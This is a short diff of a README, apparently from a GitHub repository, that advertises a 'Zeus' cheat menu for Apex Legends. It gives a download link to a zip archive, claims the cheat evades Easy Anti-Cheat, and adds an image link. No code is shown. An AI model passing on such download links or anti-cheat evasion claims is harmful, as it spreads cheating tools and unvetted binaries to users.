@@ -4,7 +4,7 @@
 - Supported Anti-Cheat(s) Easy Anti Cheat
 - Publisher Respawn Entertainment
 # [Download Zeus Apex](https://github.com/superbrogoat9759/ApexLegendsZeusMenu/releases/download/Download/ZeusMenu.zip)
-[![1]()]()
+[![1](https://github.com/superbrogoat9759/ApexLegendsZeusMenu/releases/download/Download/Apex.png)]()
 
 
 ### Zeus is undetected now.
